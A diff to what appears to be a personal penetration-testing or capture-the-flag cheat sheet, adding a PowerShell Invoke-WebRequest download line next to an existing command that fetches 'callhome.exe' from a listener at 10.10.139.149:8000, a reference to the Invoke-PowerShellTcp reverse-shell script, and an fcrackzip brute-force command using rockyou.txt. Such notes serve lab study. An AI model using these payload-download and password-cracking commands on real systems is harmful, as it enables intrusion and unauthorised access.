@@ -109,6 +109,10 @@ with powershell (first also invokes a script, in this case Invoke-PowerShellTcp 
 
 `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.139.149:8000/callhome.exe','callhome.exe')"`
 
+or more simply, in powershell:
+
+`Invoke-WebRequest -Uri $url -OutFile $output`
+
 ## cracking zips
 
 apart from zip2john and john, there is also `fcrackzip -b --method 2 -D -p rockyou.txt -v extracted.zip`
